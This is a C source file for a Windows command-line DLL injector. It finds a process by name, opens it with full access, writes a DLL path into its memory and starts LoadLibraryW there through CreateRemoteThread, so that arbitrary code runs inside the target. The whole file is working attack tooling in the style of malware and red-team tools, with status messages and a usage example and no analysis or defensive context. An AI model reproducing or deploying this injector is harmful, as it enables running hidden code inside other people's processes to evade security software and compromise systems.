#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


#define KERNEL32_DLL "kernel32.dll"
#define LoadLibraryW "LoadLibraryW"


DWORD GetPidByName(WCHAR* ProcessName) {
	PROCESSENTRY32W PE;
	PE.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	int pid = 0;
	if (Process32FirstW(hsnap, &PE)) {
		do {
			if (lstrcmpiW(ProcessName, PE.szExeFile) == 0) {
				pid = PE.th32ProcessID;
				CloseHandle(hsnap);
				 return pid;
			}
		} while (Process32NextW(hsnap, &PE));
	}

	CloseHandle(hsnap);
	return 0;
}

int wmain(int argc , wchar_t * argv []) {


	if (argc < 3) {
		wprintf(L"Usage: Dll_Injector.exe process_name DLL_Path\n");
		wprintf(L"Example: Dll_Injector.exe Notepad.exe C:\\Users\\user\\Desktop\\Dll_Injector\\x64\\Release\\MyDLL.dll");
		return -1;
	}

	DWORD   ProcId   = 0;
	WCHAR*	ProcessName = argv[1];
	WCHAR*  dllpath  = argv[2];
	BOOL    inheritHandle = FALSE;
	HANDLE  hproc = NULL;
	SIZE_T  dllsize = (lstrlenW(dllpath) + 1) * sizeof(WCHAR);
	PVOID   pAddress = NULL;
	HMODULE hmodule = NULL;
	PVOID   loadLibraryW = NULL;
	HANDLE  hthread = NULL;

	ProcId = GetPidByName(ProcessName);
	if (ProcId == 0) {
		wprintf(L"[-] Target Process Not found : %s\n", ProcessName);
		return -1;
	}
	wprintf(L"[+] Target_Process : %s\n", ProcessName);
	wprintf(L"[+] PID: %lu\n", ProcId);
	
	hmodule = GetModuleHandleA(KERNEL32_DLL);
	loadLibraryW = GetProcAddress(hmodule, LoadLibraryW);
	hproc = OpenProcess(PROCESS_ALL_ACCESS, inheritHandle, ProcId);

	if (hproc == NULL) {
		wprintf(L"[-] OpenProcess() -> failed | Error Code: %lu\n", GetLastError());
		return -1;
	}

	pAddress = VirtualAllocEx(hproc, NULL, dllsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (pAddress == NULL) {
		wprintf(L"[-] VirtualAllocEx() -> failed | Error Code: %lu\n", GetLastError());
		CloseHandle(hproc);
		return -1;
	}

	if (!WriteProcessMemory(hproc, pAddress, dllpath, dllsize, NULL)) {
		wprintf(L"[-] WriteProcessMemory() -> failed | Error Code: %d \n", GetLastError());
		VirtualFreeEx(hproc, pAddress, 0, MEM_RELEASE);
		CloseHandle(hproc);
		return -1;
	}

	hthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryW, pAddress, 0, NULL);
	if (hthread == NULL) {
		wprintf(L"[-] CreateRemoteThread() -> failed | Error Code: %d \n", GetLastError());
		VirtualFreeEx(hproc, pAddress, 0, MEM_RELEASE);
		CloseHandle(hproc);
		return -1;
	}
	wprintf(L"\n[+] Dll Injected Waiting for thread to finish...\n");
	
	WaitForSingleObject(hthread, INFINITE);


	CloseHandle(hproc);
	CloseHandle(hthread);


	return 0;
}
